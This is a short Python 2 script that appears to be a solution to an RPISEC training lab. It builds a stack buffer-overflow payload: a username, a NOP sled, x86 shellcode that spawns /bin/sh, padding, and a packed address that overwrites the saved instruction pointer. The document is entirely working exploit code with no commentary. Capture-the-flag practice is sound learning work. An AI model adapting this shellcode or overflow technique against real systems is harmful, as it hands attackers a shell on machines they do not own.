import struct

def p(x):
    return struct.pack("<I", x)

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

payload = ""
payload += "rpisec" # Send username
payload += "\x90" * 20
payload += shellcode
payload += "\n"

payload += "A" * 80 # Send password
payload += p(0x8049c40 + 8) # EIP
payload += "\n"

print payload
